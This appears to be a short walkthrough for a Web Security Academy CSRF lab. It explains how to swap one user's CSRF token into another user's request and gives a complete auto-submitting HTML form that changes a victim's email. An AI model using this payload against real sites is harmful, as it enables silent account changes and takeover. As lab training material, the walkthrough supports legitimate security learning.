```bash
1. login : 1st wiener user -- 2nd incognito tab for carlos user
2. update the wiener's email
3. update the email while intercepting the request
4. send this request to the repeater drop all the request and turn off the intercept

TEST CASE
a. send the capture request  --  302 Found
b. repeat the 3rd and 4th process in carlos account then update the CSRF token with carlos user and send the request --  use inspect element and search csrf  --  get the CSRF token (carlos user) 
   302 Found

5. repeat a and b for carlos but don't send the request after updating the CSRF token  --  refresh the carlos users browser to get a new CSRF token
6. generate: CSRF PoC  --  update the email value

CSRF PAYLOAD

<!DOCTYPE html>
<html lang="en">
	<body>
		<form method="POST" action="https://lab-id.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="gvbbvb@fake.com">
			<input type="hidden" name="csrf" value="0dKOOMU9tx6DVAdENQ8M89pZ77GcL4vK">
			<input type="submit" value="Submit Request">
		</form>
	</body>
  <script>document.forms[0].submit();</script>
</html>
 

7. press the back button of the browser  --  do not refresh the browser
8. go to the exploit server deliver to the victim and done
9. NOTE if you viewed the exploit then update the email value
```
